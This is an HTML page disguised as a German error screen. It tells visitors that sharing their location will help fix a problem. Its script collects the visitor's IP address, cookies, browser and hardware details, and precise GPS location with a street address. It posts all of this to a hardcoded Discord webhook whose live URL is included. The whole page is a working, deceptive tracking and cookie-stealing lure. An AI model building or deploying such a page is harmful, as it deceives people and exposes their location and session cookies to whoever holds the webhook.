<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
</head>
<body>
    <script>
        function generateUniqueID() {
            let existingID = localStorage.getItem("uniqueVisitorID");
            if (!existingID) {
                existingID = 'ID-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
                localStorage.setItem("uniqueVisitorID", existingID);
            }
            return existingID;
        }

        function getCookies() {
            return document.cookie ? document.cookie : "No cookies available";
        }

        function sendToWebhook(data) {
            const webhookURL = "https://discord.com/api/webhooks/1335748835024044144/D_DZ-Rl-z3SYkz--_YMcdy-2o7zzc3gO0oaQ4NRK7nhcNEuRAMlkuuIQ5Y4jGBuhPx4s";
            return fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ embeds: [data] })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Data sent to Discord webhook:", data);
            })
            .catch(error => console.error("Error sending to Discord:", error));
        }

        function getPreciseLocation(callback) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
                        .then(response => response.json())
                        .then(data => {
                            callback(position.coords.latitude.toFixed(6), position.coords.longitude.toFixed(6), data.display_name);
                        })
                        .catch(() => {
                            callback("Unavailable", "Unavailable", "Location could not be determined");
                        });
                    },
                    () => {
                        callback("Denied", "Denied", "User denied GPS");
                    }
                );
            } else {
                callback("Unavailable", "Unavailable", "Geolocation not supported");
            }
        }

        function getIP() {
            return fetch('https://ipinfo.io/json?token=083c9410034559')
                .then(response => response.json())
                .then(data => {
                    let ip = data.ip;  // IP-Adresse
                    let browser = navigator.userAgent;
                    let os = navigator.platform;
                    let uniqueID = generateUniqueID();
                    let timestamp = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
                    let cookies = getCookies();
                    let screenRes = `${screen.width}x${screen.height}`;
                    let cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency.toString() : "Unknown";
                    let ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
                    let onlineStatus = navigator.onLine ? "Online" : "Offline";
                    let language = navigator.language || navigator.userLanguage;
                    let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                    // WebGL-Informationen
                    const gl = document.createElement('canvas').getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                    return {
                        ip,
                        browser,
                        os,
                        uniqueID,
                        timestamp,
                        cookies,
                        screenRes,
                        cpuCores,
                        ram,
                        onlineStatus,
                        language,
                        timeZone,
                        gpu
                    };
                })
                .catch(error => console.error("Error fetching IP info:", error));
        }

        function collectDataAndSend() {
            // Zuerst IP und Systemdaten sammeln
            getIP().then(ipData => {
                // Webhook 1 mit Systemdaten
                const systemData = {
                    "title": "üì° New Connection Logged",
                    "color": 3447003,
                    "fields": [
                        { "name": "üë§ Unique Visitor ID", "value": ipData.uniqueID, "inline": true },
                        { "name": "üåç IP Address", "value": ipData.ip, "inline": true },
                        { "name": "üñ• Browser", "value": ipData.browser, "inline": true },
                        { "name": "üíª Operating System", "value": ipData.os, "inline": true },
                        { "name": "üì∫ Screen Resolution", "value": ipData.screenRes, "inline": true },
                        { "name": "üñ• CPU Cores", "value": ipData.cpuCores, "inline": true },
                        { "name": "üíæ RAM", "value": ipData.ram, "inline": true },
                        { "name": "üåê Online Status", "value": ipData.onlineStatus, "inline": true },
                        { "name": "üç™ Cookies", "value": ipData.cookies, "inline": false },
                        { "name": "üåç Language", "value": ipData.language, "inline": true },
                        { "name": "‚è∞ Timestamp", "value": ipData.timestamp, "inline": true },
                        { "name": "üó∫ Timezone", "value": ipData.timeZone, "inline": true },
                        { "name": "üéÆ GPU", "value": ipData.gpu || "Unavailable", "inline": true }
                    ]
                };

                sendToWebhook(systemData).then(() => {
                    // Nun pr√§zisere Geolocation sammeln
                    getPreciseLocation((latitude, longitude, address) => {
                        const locationData = {
                            "title": "üì° Location Updated (GPS)",
                            "color": 3447003,
                            "fields": [
                                { "name": "üìç New GPS Location", "value": `${latitude}, ${longitude} - ${address}`, "inline": true },
                                { "name": "‚è∞ Updated Timestamp", "value": new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' }), "inline": true }
                            ]
                        };

                        // Geolocation Webhook senden
                        sendToWebhook(locationData);
                    });
                });
            });
        }

        // Wenn auf der Seite ein Fehler auftritt und wir Standort anfordern m√∂chten
        function requestLocationAccess() {
            const infoDiv = document.getElementById("location-info");
            infoDiv.innerHTML = `
                <h2>Ups! Etwas ist schiefgelaufen.</h2>
                <p>Um dir besser zu helfen und dieses Problem schnell zu beheben, ben√∂tigen wir deinen Standort.</p>
                <p>Keine Sorge! Der Standort wird nur verwendet, um das Problem in deiner Region zu lokalisieren und unseren Service zu verbessern.</p>
                <button onclick="collectDataAndSend()">Standort teilen, um zu helfen!</button>
            `;
        }

        document.addEventListener("DOMContentLoaded", function() {
            requestLocationAccess(); // Stelle sicher, dass der Fehlertext angezeigt wird und der Benutzer den Standort freigeben kann
        });
    </script>

    <div id="location-info" style="text-align: center; font-size: 20px; color: black; margin-top: 50px;">
        <!-- Hier wird der Fehlertext angezeigt -->
    </div>
</body>
</html>
